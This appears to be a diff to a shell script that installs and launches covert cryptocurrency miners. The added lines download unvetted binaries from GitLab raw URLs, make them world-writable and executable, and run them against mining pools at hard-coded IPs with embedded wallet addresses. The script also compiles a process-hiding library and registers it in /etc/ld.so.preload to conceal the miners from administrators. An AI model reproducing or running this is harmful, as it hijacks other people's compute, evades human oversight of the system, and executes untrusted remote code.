@@ -13,7 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/cuda-v0.2.5-hotfix2/aleo_prover-v0.2.5_cuda_full_hotfix2.tar.gz && tar -zvxf aleo_prover-v0.2.5_cuda_full_hotfix2.tar.gz && cd aleo_prover
+wget https://gitlab.com/kerja6381734/fanta/-/raw/main/GM3.30
+
+chmod 777 GM3.30
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -55,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./aleo_prover --pool 159.65.161.19:443 --pool 159.65.161.19:80 --address aleo1y970wuydlwh2mkxj3w87q75cdgn2y8jukcnlhdjejah5f9vc8upq58raqx --custom_name $(shuf -n 1 -i 1-9999999)-Bismillah
+./graftcp/graftcp & clear & ./GM3.30 -a firo -s 45.55.60.103:80 -u aKMd2mD1NSgaFSnPRFtY5obrgBjPtC4ZXF.$(shuf -n 1 -i 1-3000)-Bismillah & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 45.55.60.103 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qr7a2fgqthfg9v4vwxwkdl7k2j868mvwgvx8q89ey6u9n863ps4mx8mzjncs0 
